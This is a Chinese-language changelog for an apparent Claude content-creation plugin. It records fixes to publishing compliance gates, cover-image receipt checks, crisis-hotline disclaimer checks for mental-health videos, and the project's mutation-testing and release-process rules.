# 更新日志

NBDpsy 内容创作 skills（`nbdpsy-content` 插件）的版本变更记录。

格式参考 [Keep a Changelog](https://keepachangelog.com/zh-CN/1.1.0/)，版本号遵循 [语义化版本](https://semver.org/lang/zh-CN/)：
**Feature = Minor（1.x.0）｜Bugfix = Patch（1.0.x）｜Breaking = Major（x.0.0）**。

> 每次发版：改 `.claude-plugin/plugin.json` + `.claude-plugin/marketplace.json` 的版本号（共 3 处），在本文件顶部追加一节，然后 `git push`。
>
> 🔴 **规格类改动发版前必跑「零上下文干跑」**（2026-08-16 立为常设工序）：派一个**禁读设计文档/实证档案**的代理，
> 只读改后的 skill 文档与 scripts/ 实际代码，**把文档当真去执行一遍**（推演真实路径，含返工与出错分支），
> 并逐条尝试绕过新写的闸门。它治的是实证档案治不了的病——实证是回头看**已发生**的事故，
> 干跑是在事故发生前发现「**文档与代码各自都对、合起来必炸**」的组合坑。
> v1.99.0 一次干跑实测抓出四处「照文档做就一定撞」：凭证比全名 vs 文档要求转 JPG、
> 预检放行真发才拒、命令缺参数导致台账登记漂目录、判据只在 references 主文档漏两条。
> ⛔ 只跑测试不跑干跑＝只验了代码自洽，没验文档可执行。
>
> 🔴 **验证路径必须与生产路径逐段同源**（2026-08-16 立）：**凭据来源、工作目录、环境变量、入口命令**——
> 任何一段不同源，红绿都不作数。实证：日报 `--dry-run` 预演报 401，差点判「明早 cron 会挂」，
> 实则生产 key 直调 200，是**预演自己读错了凭据文件**（走本机开发路径而非 cron 那份）。
> ⚠️ **假红比假绿更阴**——假绿看起来可疑，假红**看起来像尽责**，同样没验到真东西，还会引发一整轮朝错方向的排查。
>
> ⚠️ **多条线并行发版的两条铁律**（已出过三次事故）：
> ① **新版本号 = 本文件顶部第一个版本节的号 +1**，不是"你这条线上一个号 +1"——仓库只有一个
> 版本序列，各线各排各的号会把全局版本号越写越小（1.62.0 → 1.61.5 → 1.59.2 都真实发生过），
> 装了新版的机器会被判成"版本过旧"。发版前先看本文件第一节或 `git log` 最近一次发版号。
> ② 你的 CHANGELOG 新节**必须插在本文件最顶部**（`---` 分隔线之后）；commit 前 `git pull` 一把，
> 确认没有别的线刚发过版把你的节顶下去。
> ③ 顺带核对 `nbdpsy-guide`：新增/升级的能力若影响运营入口（新技能、新触发语、新红线），
> 向导要同步——guide 是唯一的公共汇合处，已两次被所有线漏掉。

---

## [2.33.0] — 2026-08-22

### 修复 — typeset 线的封面**一张都发不出去**（第二个恒拒，本版修好）

`typeset_longimage` 一直在 `COVER_SOURCES` 白名单里，却**没在闸门 A 开分岔** ⇒ 被要求
`confirmed_by` / `confirmed_at` / **`prompt_excerpt`**，而它是**确定性排版渲染、压根没有提示词**。
⚠️ 闸门自己的注释当时就写着「⛔ 别对 HTML 路要一段不存在的提示词」——
**规则写对了，只有 `render_cover` 一条路被接上**。⇒ 又一次「提醒只保护它点名的那一处」。

**⛔ 只免确认戳与提示词，不免凭据**——凭据换成确定性字段（与 `render_cover` 同构）：
- 产线侧补 `cover_file`（防张冠李戴）与 `palette`（**实际生效**的调色板：`THEMES[theme]`
  叠加档案覆盖之后那一份，HTML 就是拿它生成的）；
- 闸门侧新增 `typeset_evidence`，判**给哪张图 / 哪个主题 / 实际什么色**，缺一即拒。

**为什么不让 typeset 写 `cover_only: True` 混过去**：它一次出 N 页，**那是谎**。
🔴 逼产线编一个好看的值来过闸，**正是这条闸门要防的东西本身：造假留痕**。
⇒ 宁可在闸门那边显式免除并写明理由（确定性渲染重渲 byte 级不变，「批量重出覆盖已确认封面」
那个风险不存在），⛔ 不在产线那边编一个不真实的字段。

### 收窄 — 单出闸的免除**只给 typeset**，⛔ 不给 render_cover

🩸 首版把 `cover_only` 免除给了整个 `DETERMINISTIC_SOURCES`，**连带削弱了 render_cover** ——
而它一次渲染只出一张图，写的 `cover_only: True` 是**真话**、本来就过得去。
被 `test_render_cover_still_needs_style_profile_and_single_out` 当场抓住。
⇒ **能靠说真话过的，就别给它开豁免。** 已加防回归锚。

### 测试

`test_style_gate_three_lines.py` 25 → 35 例，全量 **2001 → 2012 全绿**。
**七向变异全对**：豁免生效（缺 excerpt→绿）／豁免不外溢（假 source 两种→拒）／
豁免不是旁路（palette 空、theme 空、张冠李戴、缺 version→四种全拒）。
⚠️ 上一版那个"钉住现状"的测试已**翻正**（改成验豁免真的生效且不外溢），
⛔ 不是把断言反过来了事。

---

## [2.32.0] — 2026-08-22

### 新增 — 风格档案校验补齐到**三条封面产线**

v2.28.0 只做了 `render_cover`。本版补上另两条，三处**共用同一个 `verify_declaration`**
（⛔ 别各写一遍：口径一漂闸门就形同虚设）。

- **`gen_images`**：拦在 **`create_job` 之前**——出图是**花钱**的，与 R4 结构闸门并列在
  「拒跑，⛔ 不出图不烧额度」那个位置。`--job` 复查路径**不拦**（钱已经花了，拦了只是让人
  拿不到图），但**仍自己补核一次写进凭证**——核只为溯源。
- **`typeset_longimage`**：新增 `--style-profile` / `--style-timeout`，凭证按三线统一口径写
  `{套名, version}`。
- 两处凭证都新增 `style_profile_check`（三态 verified）。

### 修复 — typeset 线的封面凭证**恒缺 style_profile**（一条恒响的闸门）

🩸 这条线原来取的是 `(typeset段).get("name")`，而 **typeset 段的键只有**
`theme/bg/accent/accent_soft/font/title_font/indent/texture` —— **压根没有 `name`**。
⇒ `style_profile` **恒为 `null`** ⇒ 发布时闸门 A **恒拒**（它要求 `套名` + `version` 都在）。
根因：`load_style` 剥掉 `--get` 外壳时把 **`set` / `version` 一起丢了**，而身份就在那层壳上。
⇒ 新增 `load_style_meta` 专门取身份，⛔ 不动 `load_style`。
🔴 **一条恒响的闸门等于没有闸门**——这条线的封面此前根本发不出去。

### 修复 — 闸门 A 遇到非 dict 的 style_profile 会**崩溃**而不是拒绝

typeset 一度把它写成**套名字符串**，字符串没有 `.get` ⇒ 抛 **AttributeError**。
⚠️ 那是**崩溃**不是**拒绝**：给的是一条堆栈，人看不出"凭证格式不对"，更看不出该修哪条产线。
⇒ 显式判类型，变成一条能照着修的拒绝理由。

### 修复 — 示例串第 15 个传播点长在**告警文本**里

`gen_images` 的告警写着 `--style-profile "图文 v3"` —— **档案库里不存在的组合**
（「图文」只有 v2），而且**人看到告警就会照抄**。
连同两处 docstring 示例一并改成占位符 `<套名> v<N>`。
⚠️ 分类处理：**事故复盘里的引用⛔不动**（那是在讲那次事故，用法正确），
只改**会被当值抄走的位置**。新增测试钉死这条区分。

### 登记 — 一个**没在本版修**的缺陷

`typeset_longimage` 档在闸门 A 那边走 `else` 分支，要 `confirmed_by` / `confirmed_at` /
**`prompt_excerpt`** —— 而它是**确定性排版渲染、压根没有提示词**。
闸门自己的注释都写着「⛔ 别对 HTML 路要一段不存在的提示词」，却**只给 `render_cover`
开了分岔，typeset 漏了**。⇒ 这条线的凭证仍过不了闸门 A（**第二个"恒拒"**）。
⚠️ 改发布端行为影响面大且不在本轮批准范围，**已用测试钉住现状并写明这是缺陷**
（`test_typeset档在闸门A那边还没开分岔`，修好后它会红，⛔ 别只把断言反过来了事）。

### 测试

新增 `tests/test_style_gate_three_lines.py`（25 例），全量 **1976 → 2001 全绿**。
**五项变异全部被杀**：gen_images 不再核／永不拒跑／typeset 永不拒渲／
闸门 A 去掉类型防御／告警里放回可抄的错标。

---

## [2.31.0] — 2026-08-22

### 新增 — `check_video_crisis.py`：判-6 的确定性量具（确-5）

**设计范式：语义判断留给人，「人说的话是否属实」变成确定性检查。**
脚本只做两件确定性的事——① 声明**在不在**（两种数字写法都认）；② 走豁免时，
人引的那句**处置权句是不是真在口播稿里**。
🔴 **⛔ 它不判「这条片该不该有声明」**：`needs_exemption` 的意思是「要人看一眼并给依据」，
⛔ 不是「这条违规」。⚠️ 实测「创伤后应激」在 **7 条 brand 品牌片**里全部命中——
那是账号**自我介绍**时说自己聊什么。**提及诊断名词 ≠ 让观众对号入座**，
这个区分脚本判不了，所以它**故意不做终判**。
⇒ 脚本永远不冤枉人，但**豁免必须留下可核的证据**。

exit 语义三分：`0`＝这一关过了／`1`＝命中 6-a 触发词却无声明且无可核豁免依据／
**`2`＝量不出来**（找不到口播稿）。

### 这个闸门绕开的三个量具坑（都是定判-6 当天**实撞**的）

1. **中文数字写法**：两条**涉药片**被 `grep "12356"` 判成"没有声明"，实际声明完整存在
   ——口播稿写的是「号码是**一二三五六**」（TTS 要念）。⇒ 两种写法都认。
2. **⛔ 不许 rglob 全目录**：`grep -rl "12356" <目录>` 命中的是工作目录里拷的
   **`render_card.py` 脚本源码常量**、以及 **`post-video.md` 笔记正文**——
   一次全目录 grep 把 **12 条**片子误判成"有声明"。⇒ 只读**显式列举的口播稿来源**。
3. **「量不出来」≠「没有」**：找不到口播稿退 **2** ⛔ 不退 1。
   `benchmark-*` 是别人的片、放映线的声明可能**烧在图上**。
   **报「没有」会让人去给一条其实合规的片子补声明。**

⚠️ 一天之内被同一类量具坑了三次，每次坑法不同 —— **这组实证比闸门本身更能说明闸门为什么必须存在**。

### 修复 — 处置权句比对：全角/半角标点必须一起抹

🩸 变异测试当场抓到：首版字符类里只有全角「，」，人从成片抄那句话时输入法出了个
**半角逗号**就判不匹配 —— 而红灯写的是「你引的句子不在正文里」，
照它去查会以为**引错了句子**，实际只差一个标点的宽窄。⚠️ 又一次「响错理由」。
⇒ 改用字符集合，⛔ 不用正则字符类（里面要同时放中英文引号，转义在这一处炸过一次）。

### 测试

新增 `tests/test_check_video_crisis.py`（23 例），全量 **1953 → 1976 全绿**。
**豁免路径六项变异全部符合预期**：不给依据→红／真句子→绿／假句子→红／
半角标点→绿／原样→绿／**正文删掉该句后再豁免→红**。
真语料回归：28 个目录全跑，判定分布与人工结论逐条对上
（`kepu-*`+`qiuqiu-*` 全 ok、`brand-*` 走 needs_exemption 而非误杀、`benchmark-*` 报 unmeasurable）。

### 变更 — `checklist-video.md`

确定性检查表加**确-5**；判-6 新增 **6-e**「确-5 替你做什么、⛔ 不替你做什么」；
⚠️ 同时**改掉了上一版刚写的「这条 blocker 没有确定性闸门兜底」**——那句话在本版已不成立。

---

## [2.30.0] — 2026-08-22

### 变更 — 视频审查判-6（片尾危机声明）定适用范围与豁免条件

此前判-6 是**无条件 blocker、四种形态全适用**。但产线里有大量正当的片子根本不落在它要防的场景
（品牌/招聘介绍、辟谣、认知偏差科普、原型 demo、对标样本）。
🔴 **一条恒响的 blocker，人只会习惯性豁免它——而习惯性豁免之后，真该响的那次也不会有人停下来。**
⇒ 这次收窄范围是**给这条闸门保住信用**，⛔ 不是给它开口子。

- **6-a 适用范围**：出现症状/障碍/诊断名词或「你身上这件事有个名字／机制」句式；涉及自伤/自杀/用药/停药/减药/就医；
  描述持续性痛苦且具体到会让人**对号入座**。
- **6-b 豁免**（两条同时满足）：① 片子给的是**选择权或认知松动**而非**病理标签**；
  ② 🔴 **正文里必须真有那句把处置权交回观众的话，且报告要逐字引出来**。
  **⛔ 停在机制就不算豁免** —— 讲完「亲近曾经和伤害绑在一起」就收尾＝给了标签不给出路，
  那恰恰是最需要热线的形态。
- **6-c 天然不适用**：原型/demo/模板、对标样本（别人的片）。判据是**会不会被发布**，⛔ 不是目录名。
- **报告必须写明走的哪条豁免 + 逐字证据**；「我判断不需要」不算依据。

**定案方式**：拿两条真实成片各走一遍（⛔ 不是凭空定条文）——
`kepu-a-haohaoshenghuo`（科普 oneline，有落款屏）判 6-a 适用 → PASS；
`xigao-collage-01`（洗稿快节奏，无落款屏）判 6-b 豁免 → PASS。
⚠️ 判据与 `narration-spec` §八「收尾」自洽：`xplan2` 八条全部以「可做的动作／决定权在你」收尾
（x7 原话「这两个的答案**都在你手里**」）。

### 修复 — 判-6 的**取证方式**有两个盲区（走查时实撞）

1. 🩸 **`grep "12356"` 对口播稿天然盲**：`oneline-qiuqiu-chiyao` / `oneline-qiuqiu-jianyao`
   两条**涉药片**被判成"没有声明"，实际声明完整存在——口播稿写的是**中文数字**「号码是一二三五六」
   （TTS 要念，写阿拉伯数字会念成"一万两千三百五十六"）。
   ⚠️ **量具与被量对象差一层**：照这个假缺失去补，会给一条本来合规的片子补出**重复声明**。
   ⇒ 取证须同时匹配 `12356` 与 `一二三五六`。
2. 🩸 **⛔ 别只抽最后一帧**：`kepu-a` 末帧只有孤零零的「12356」，说明句在前几屏（cue 198.7s）；
   `xigao-collage-01` 末帧是**半句**（逐句上屏的片子末帧几乎必然是半句）。
   ⇒ 口径改为**读末尾 3–5 条 cue + 抽 2 帧（末帧与前一屏）**。

### 登记 — 判-6 没有确定性闸门兜底

确-1~确-4 一个都不查它；笔记线有 `check_compliance.py`，**视频线没接**，
且那个脚本判的是 `"12356" in text`，拿去查口播稿会因中文数字误报。
⇒ 审这条时**没有"脚本已经过了"这层保险**，已在条文里写明红绿全在审查者手上。

---

## [2.29.0] — 2026-08-22

### 修复 — `note_ops.py` 回执把 server 新字段静默丢掉

**根子是白名单，⛔ 不是"漏了三个键"**：回执渲染用硬编码白名单挑字段，
server 0.24.14 新增的 `topics_preserved` / `topics_tail_stripped` / `submit_confirmed`
**被整个丢掉，而且没有任何迹象说明有东西被丢了**。
⚠️ **白名单是写下那刻的世界快照** —— 修法不是把这三个补进去（下次加键还会再丢一遍），
是让不认识的键**也有地方落**：已知键升顶层，未知键收进 `extra_fields` 并明说「客户端还不认识」。

### 修复 — 脚本自印的作废话术会诱导**非幂等真提交**

成功回执里印着：「改正文会丢掉既有话题实体……要保住这些话题，得把它们**写进新正文重新发布**」。
**双重作废**（语义已向 xhs-server 取准话）：
1. 事实作废：0.24.14 起服务端**自动保留**既有话题，保不住就**整单弃提交**（笔记原样未动）；
2. 🔴 **它教人做的事在任何版本下都是错的** —— 为保住话题去"重新发布"会**造出一篇重复笔记**。
   **脚本自印的过期话术，比没有话术危险得多。**

触发条件也早就错了：`topics_dropped` 现在＝**替换前的既有实体名单**（与 preserved 成对读），
拿它当"丢失"判据＝**把一次正常回执渲染成事故**。
⇒ 新单（回执带那三个键）按保留语义说话；旧单保留丢失话术但**删掉「重新发布」那半、改为明确劝阻**。

### 修复 — `submit_confirmed` 三态：`false` 与 `null` 语义相反，却都是 falsy

- `true` ＝点了发布且收到平台响应
- `false` ＝一次发布都没点（与 `aborted_before_submit=true` 同义，**可安全重试**）
- **`null` ＝点了发布但没等到响应确认 ⇒ fail-closed，禁直接重试**

🔴 写成 `not view.get("submit_confirmed")` 会把**禁重试**渲染成**可安全重试**，
运营照着那句去重跑就是一次实打实的重复提交。⇒ 判据一律用 `is False` / `is True` 精确比较。
同理 `topics_preserved` 的 `null`（不知道）与 `[]`（两种来路）**空值本身有语义**，
⛔ 不许按"空"过滤掉 —— 被过滤后回执**看起来跟"一切正常"一模一样**。

### 测试

新增 6 例（含"新键不再被丢""未知键有地方落""null 禁重试""空值有语义"）。全量 **1947 → 1953 全绿**。
**四项变异全部被杀**（退回硬编码白名单 / truthy 判 submit_confirmed / 空值被过滤 / 去掉未知键兜底）。

⚠️ 另修一处测试自身的判据缺陷：断言写成 `"重新发布" not in hint` 会把
「**别为此**重新发布」这句**劝阻**误判成教唆 —— **判据要抓句法方向，⛔ 不是抓词**。

---

## [2.28.0] — 2026-08-22

### 新增 — 封面凭证的风格档案校验（**会拒渲**）

`render_cover.py` 出图**前**核「声明的那套档案在不在档案库里」、出图**后**核「档案声明的色是不是真渲出来了」。

**为什么**：凭证里一直同时躺着 `style_profile`（声明用了哪套）与 `palette`（实际渲出什么色），
**从来没人把这两个数相减** —— 字段在、判据在、每次都过，连"量不出来"的迹象都不给。
这是闸门失效的第 ⑤ 种形态：**验了「在不在」，没验「对不对」**。
🩸 实证：2026-08-21 十三份凭证标着 `图文 v3` 一路绿灯到发布前才被人肉发现，
而档案库里**「图文」只有 v2**（v3 是「暖米大字」的）。
**错标比缺失更毒**：缺失会被闸门 A 拒（有声音），错标畅通无阻，而**凭证的意义就是溯源，错标＝溯源断**。

- 新增 `style_profile.py` 的 `norm_hex` / `declared_palette` / `fetch_declared` / `verify_declaration`
  —— **三处凭证产线共用这一份**，⛔ 别各写一遍（口径一漂闸门就形同虚设）
- `render_cover.py` 新增 `--style-timeout`（默认 20 秒），凭证新增 `style_profile_check`
- 三态 `verified`，⛔ 不是布尔：`true` 核过／`false` 档案库明确说没有（**拒渲**，exit 2）／
  `null` 这次没核成（没配 key / 连不上 / 超时 / 5xx）→ **warn 放行且凭证如实留痕**
- 色值判据方向是**「档案声明的 ⊆ 实际渲出的」**：模板有正当的中性色（jinjin 的墨蓝 `#2B3A4A`）
  档案根本没记，写成反向就**恒红**，而**恒红的闸门等于没有闸门**
- ⛔ **不提供 `--skip-style-check`**：逃生门一开就会变成默认习惯

### 修复 — 「响错理由」：5xx 被当成「档案对不上」

🩸 开发中实测撞上：源站抖了一下回 **HTTP 530**（Cloudflare 源站不可达），
首版把它并进「档案库说没有这一版」⇒ **一张完全正常的图被拒渲，红灯却写着「风格档案对不上档案库」**。
照那个红去查，人会去改留痕行、改档案，而**真正的问题是源站挂了**。
⇒ 判据收窄到**只认 404**；其余 4xx/5xx 一律抛 `Unreachable`（＝没核成），⛔ 不说成档案错。

### 修复 — 测试与文档里的错标（同一个传播源的第 14 个受害者）

- `tests/test_render_cover.py` 四处硬编码 `图文 v3`（三处入参 + 一处断言）—— 闸门上线后当场红。
  **这不是"测试旧了"，是闸门抓到了测试自己的错标**：它一直用着档案库里不存在的组合，而以前一路绿灯。
  已改为真实存在的 `图文 v2`，并留下防抄回的说明。
- `references/illustration-spec.md` 的命令行参数表**此前连 `--style-profile` 都没有**（只在 `--help` 里）。
  已补该参数 + `--style-timeout` + 整节校验行为说明。

### 测试

新增 `tests/test_cover_style_check.py`（46 例）。全量 **1901 → 1947 全绿**。
**六项变异全部被杀**（校验恒绿 / 比色恒绿 / 判据方向写反 / 530 归并回「档案错」/ 摘掉拒渲 / 把"量不出来"说成"不匹配"）。
端到端真渲验证：`verified: true` + `palette_ok: true`；模板改一个色 ⇒ 精确报出丢的是 `#C9D6CE`。

### 工序豁免留痕 — 本版**没跑**「零上下文干跑」

⚠️ **登记在案，⛔ 不让「没跑」无痕**（收口人 2026-08-22 批准豁免）。
豁免理由：本版改的是**代码闸门**而非工序规格（SKILL.md 的操作流程一字未动），
且已有 E2E 真渲 + 真档案库 + 六项变异覆盖，并补齐了 `illustration-spec.md` 的参数表。
🔴 **下次凡动 SKILL.md 工序描述的，干跑必跑**——本会话派不了子代理时，由收口人那边派。

### 已知未做（⛔ 不算做完）

`gen_images.py` 与 `typeset_longimage.py` 同样只写不核，**本版未接**：
- `gen_images` 需要区分「新提交」与「`--job` 复查」两条路径（复查时钱已经花了，拦无意义）；
- `typeset_longimage` 的 `style_profile` 是**套名字符串、没有版本号**（与另两处的 `{套名, version}` 形状不同），
  且档案来自本地 JSON 文件而非留痕行 —— 需要单独定口径。

---

## [2.27.1] — 2026-08-22

> 小红书运营在 8/22 首批（job 355–359）撞到的两个台账 bug。

### 🔴 bug-A：台账取段必须按前缀，⛔ 不按位置

🩸 **我自己引入的回归**：8/21 我把 `note=` 段插在 `job=` 之后，
而 recheck 路径用 `parts[4][4:]` **按位置取第 5 段**
⇒ `parts[4]` 取到 `note=6a88ec1e…`，`[4:]` 切掉 `note` 正好剩 **`=6a88ec1e…`**
⇒ 台账里「这条当初想设哪张封面」被覆盖（357/358 两条）。

🔴 **我加段时守住了"前 4 段位次不动"，却没想到有人在数第 5 段。**
⇒ 位置解析的脆弱不在"加段的人"，在**读的人按位置读** ——
⛔ **行格式一旦可扩展，就不许再按下标取段。**

### 🔴 bug-B：登记失败必须出声，且要能补登

🩸 job 358：component job **在库里干干净净 `done`、无 502、无 unknown** ——
服务端如实给了结果，**漏写发生在客户端登记这一步**。
而 `record_remedy` 的三个失败分支只把 `recorded: false` 塞进返回值，
调用方**既不告警也不改退出码** ⇒ **静默**。

⚠️ 与 8/19 那次**是不同路径**：那次是 502 断轮询「**没等到结果**」（v2.19.1 修的是它）；
这次是「**拿到了结果却没写**」—— ⛔ 别以为修过一次就把这条路堵严了。

- 登记失败 ⇒ **stderr 显著告警**，并给出补登命令
- 新增 `--record-remedy <cjob> --job <发布任务号>`：**只写台账、零网络零提交**
  ⇒ ⛔ 别为补登去重跑 `--fix-cover`（**每次重跑都是一次真提交**）

### ⚠️ 测试断言不许把注释也算进去

`assert "parts[4][4:]" not in src` 当场红 —— 而**代码早已改好，命中的是注释里
正在讲它为什么错的那段引用**。已改成**只扫代码行**。
（与早先「测试写死白名单拼接串」同族：**量具把自己要找的东西写进了被量对象**。）

测试 1899→1901，全量 1901 passed。

---

## [2.27.0] — 2026-08-21

### 🔴 账号贴图位（`--sticker`）：jinjin 加次级位，与 avatar 并存

🩸 **起因**：咪问账号规则「每条内容带猫」，现状是在**过闸底图上 PIL 手工叠猫**
⇒ 产物**没有管线凭证** ⇒ 闸门 A 必拒，已连卡两批（靠手写 `manual_confirmed` 止血）。

**三档评估选 ②**（以模板实况定档，⛔ 不凭猜）：

| 档 | 结论 |
|---|---|
| ① avatar 位放猫 | ⭕ 零开发，**但只覆盖"没冲突的那一半"** |
| **② 次级贴图位** | ✅ **选它** —— 改模板不改渲染器，两类封面统一一条路 |
| ③ 通用叠图层 | ⛔ 那是把渲染器改成图像合成器 |

🩸 **占位冲突实锤**：kepu 批的 `avatar` 被**真人署名头像**占着（`avatar-EMP20260109003.jpg`
＋ identity 刘琼），署名规范要求真人头像 ⇒ ⛔ **不能拿猫顶掉**。
而模板里 `avatar` 是**单槽**且被老板明令定成"主要元素"（`--avatar-d: 315px` ＝画面宽 36%）。

**三条验收硬要求全过**：

| 要求 | 结果 |
|---|---|
| 不传贴图 ⇒ 输出 byte 级一致 | ✅ `git show HEAD:` 取改前脚本+模板跑基线，`cmp` **逐字节相同** |
| 位置分离靠位置、⛔ 不靠层次 | ✅ 贴右上（`.bottom` 被 avatar+ident 占着，右上是唯一常空的角）；带猫后 **hero 字高 11.04 与无猫完全一致** |
| 凭证记贴图 | ✅ `sticker: {file, pos, size}`；无猫时 `sticker: null` **键仍在** |

⚠️ **比的是 PNG 字节，⛔ 不是 HTML 文本** —— CSS 规则在但没有元素 ⇒ 不参与绘制。
⚠️ 无贴图时写 `null` 而非省略键：**「这张没贴」与「这版本还不支持贴图」必须分得开**。

### 🩸 凭证被 data URI 撑到 513KB

`input.data` **原样回显整个 data 字典**（只剔了 `icons_svg`），而 base64 塞在 `data['sticker']` 里。

⚠️ **凭证是给人读的，撑成半兆就没人会打开它，等于又回到"捞不出来"** ⇒ 剔除后回到 58KB。
⛔ 剔除写在**同一处**（`icons_svg` 旁边），⛔ 别新建一份剔除逻辑。

测试 1896→1899，全量 1899 passed。

---

## [2.26.0] — 2026-08-21

> 捞法演练抓出的两个缺口：**都不是「忘了写」，是「写了但捞不出来」**。

### 🔴 台账行带 `note_id`

**出事时对方（server/平台/用户）给的永远是 note_id** —— 平台看得见的只有它。
🩸 实测拿真实已发布 note_id grep 全部台账＝**零命中**，只能反向查台账拿标题再猜稿件。

**格式**（段位跟在 `job=` 之后，⛔ 前 4 段位次不动 ⇒ 旧行照样解析）：

```
- [x] <ts> | <稿件> | <账号> | job=349 | note=6a7b4a62… | 意图: … | 实际: … | 差集: … | 已闭环
```

⚠️ **没有 note_id 时整段不写**（⛔ 不写 `note=None`）：
「这一行没有」与「这一行有但值是 None」必须分得开 —— 前者是历史行，后者是回执真的没给。
`ledger_note_id()` 对旧行返回 `None` ＝**「这一行没记」，⛔ 不是「这条笔记没有 note_id」**。

### 🔴 机器档凭证也要署名：`created_at` + `actor`

🩸 **最扎眼的对比**：`manual_confirmed` **人工档反而齐全**（`confirmed_by`+`confirmed_at`），
而机器档因为「是工具出的」就不记 ⇒ 13 份「图文 v3」错标追责任线时，
**靠的是当事人自己承认，⛔ 不是凭证追出来的**。**机器出的一样会错，一样需要署名。**

`shared/compliance_core.receipt_stamp()` 为唯一真源，`render_cover.write_receipt()`（唯一出口）
与 `typeset_longimage` 共用 ⇒ ⛔ 三处不各写一遍。

⚠️ `actor` 解析：`NBDPSY_ACTOR` 环境变量 → 退回 `script:<脚本名>`。
**退回值不假装是会话名** —— 它答的是"哪个工具"，答不了"哪个会话"：
**答得少但答得真，比编一个像样的值强**。
⚠️ 调用方已给 `actor` 时**不覆盖**（调用方比这里更知道自己是谁），已用破坏例钉住。

测试 1894→1896，全量 1896 passed。

---

## [2.25.1] — 2026-08-21

### 🔴 停用热线闸接进两个发布脚本的入口

`publish_note.py` / `publish_video.py` 在**解析出正文之后、dry-run 之前**调 `gate_hotlines()`。

🔴 **一个只有函数没有调用点的闸门，比没有更危险** —— 它让人以为有防线。
⚠️ v2.25.0 的状态正是「**守一个不存在的东西**」的镜像：函数在、判据在、测试全绿，
**而发布路径上没有人调它**。⛔ 那时没报"已完成"。

**变异测试**（⛔ 不只跑正例）：

| | 结果 |
|---|---|
| 两脚本有调用点、且在 dry-run 之前 | ✅ |
| B2r 那类真实文本（**两个热线并列**：12356 在、后面跟着空号） | 🔴 拒，**理由指向热线本身** |
| **破坏例**：把 `gate_hotlines` 换成恒绿 | **放行了** —— 这就是"改成恒绿"的样子 |
| 还原 | 又能拒 ✅ |

⚠️ 新测试断言的是**调用点的存在与位置**，⛔ 不是"函数存不存在"（那个早就绿了）。
**位置也必须断言**：调用点若在 dry-run 之后 ⇒ 「自查绿灯、真发才红」。

测试 1892→1894，全量 1894 passed。

---

## [2.25.0] — 2026-08-21

### 🔴 `typeset_longimage` 落封面凭证 ＋ 闸门端同步（两端一起改）

🩸 这条产线此前**零凭证** ⇒ 文字版长图的笔记到闸门 A **全会被拒**
（7/30 前发的三篇是闸门上线前混过去的）。

- 产线端：渲完 **P01** 落同名 `P01.meta.json`（`source`/`style_profile`/`theme`/`rendered_at`/画布/页数）
- 闸门端：`publish_note.COVER_SOURCES` 加 `typeset_longimage`

🔴 **只做一端 = 看起来做了**：产线端落了凭证而白名单不认 ⇒ **照样拒**；
反过来白名单加了名字而产线不落凭证 ⇒ **形同虚设**。

⚠️ `style_profile` 取自**档案本身**、没有就写 `null` —— ⛔ 不编默认值：
**错标比缺失更毒**（缺失会被闸门拒＝有声音，错标畅通无阻，而**凭证的意义就是溯源**）。

**变异测试**（⛔ 不只跑正例）：凭证在 ⇒ source 在白名单 ✅／**挪走 meta ⇒ 没了**（闸门此时必须红）／
`source="手工PIL叠图"` ⇒ **不被认** ✅／存量三 source **仍全认** ✅。

> 🔴 **变异测试真正分辨的是「你走了哪条路」**：
> **「让它不红」和「把它改成恒绿」在输出上一模一样——只有故意破坏一次才分得开。**

### 🔴 发布入口停用热线硬闸（写进 `shared/` 真源）

`gate_hotlines()`：`4001619995`／`希望24` ⇒ 拒；`12356` 同句标「24 小时」⇒ 拒
（唯一可标 24h 的是 `010-82951332`）。**更正稿豁免**沿用 `is_retirement_citation`。

🩸 **首版是恒红闸门**：标准危机声明块「12356，北京 010-82951332（**24小时**）」两号同行，
那个「24小时」修饰的是**北京号** ⇒ 每一条合规稿都会被拦。已加 `(?!010-?82951332)`。
⚠️ **写完判据必须拿一条"本来就该放行的"去试** —— 只测反例测不出恒红。

🩸 **上一版我改错了文件层**：`compliance_core.py` 真源在 `shared/`，我改了 skill 下的**副本**，
`sync_shared.py` 一跑就覆盖、**改动全丢**（测试还在、代码没了 ⇒ 7 处红）。

### ⚠️ 测试不许写死白名单拼接串

`test_unknown_source_is_still_rejected` 断言里写死了 `"gen_images/render_cover/manual_confirmed"`，
加一档当场红 —— 而**代码是对的、测试才是旧的**。已改成从 `COVER_SOURCES` 取。

### 其他

`render_cover` docstring 示例串 `"图文 v3"` → `"<套名> v<N>"`
—— 🩸 那是 **13 份凭证错标的传播源**（被当真值抄用，一路绿灯到发布前）。
**文档里的示例会被当成真值抄。**

测试 1882→1892，全量 1892 passed。

---

## [2.24.0] — 2026-08-20

### 🔴 `emphasis` 实装：加重 ＋ 品牌赭红双通道，⛔ 绝不放大字号

🩸 **起因是审稿实测成片发现三段字号完全相同**——`emphasis` 有设计稿定义、有 LLM 逐屏填、
还有一道「**必须是文内子串 ⇒ 拒渲染**」的闸门守着，**却从没进过渲染层**（两个模板零处引用）。

🔴 **那条闸门从上线起就没有任何保护作用**，而**字段在、判据在、每次都过**——
连"量不出来"的迹象都不给。⇒ 当天刚修的三处硬伤词
（「他不爱你」「对方认知低」「不是支点多」）**至今没有任何画面意义**。

**它比另外两种失效都隐蔽**：

| | 迹象 |
|---|---|
| 恒报红的闸门 | 人会绕过去，**至少有迹象** |
| 量错了层 | 读数可疑，**还能被质疑** |
| **守一个不存在的字段** | **什么迹象都没有** |

⇒ 判据：**一条闸门守的东西，要能在最终产物里指出它在哪。**
⚠️ 新增任何"约束某字段"的闸门时，**同时问一句：这个字段最后落到哪儿去了？**

### 视觉方案（助理拍板）

`.em { display:inline-block; font-weight:800; color:#A34B3A; }`

- 🔴 **⛔ 绝不放大字号**：放大＝一行两种字号 ⇒ 撑破安全区或整行缩字号，**两条都违反硬契约①**
- ⚠️ **双通道是为色弱观众**：只变色他们分不出，加重是第二条通道
- 🔴 **`inline-block` 独立盒**：**行内高亮块的巨字必溢出**，那是老板抓过的"字符遮挡"真凶
- ⚠️ `ZCOOLKuaiLe` 只有一个字重 ⇒ `800` 走的是**浏览器合成加粗**，与描边叠加后是否变糊**要目视核**

**Playwright 实测（x7）**：字重 `800 vs 400` ✅／颜色 `rgb(163,75,58) vs rgb(36,30,23)` ✅／
**字号 `69px vs 69px` 相同** ✅／`inline-block` ✅／**9 段强调词 9 段落地，missed 0**。

### 像素闸新增落地核对

`report.emphasis = {want, hit, missed_sections, painted_screens}`，
**missed 非空即拒渲染**——⛔ 别再出现"闸门守着一个渲染层没实现的字段"。

